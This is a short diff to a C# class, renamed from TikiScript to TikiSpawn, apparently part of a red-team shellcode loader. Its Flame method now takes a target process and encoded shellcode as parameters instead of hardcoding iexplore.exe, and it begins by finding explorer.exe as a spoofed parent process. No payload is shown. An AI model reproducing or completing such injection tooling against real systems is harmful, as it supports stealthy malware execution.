@@ -3,13 +3,10 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-public class TikiScript
+public class TikiSpawn
 {
-    public static void Flame()
+    public static void Flame(string targetProcess, string encodedShellcode)
     {
-        string targetProcess = @"C:\\Program Files\\Internet Explorer\\iexplore.exe";
-        string encodedShellcode = @"";
-
         int parentProcessId = PPID.FindExplorer();
 
         if (parentProcessId == 0)
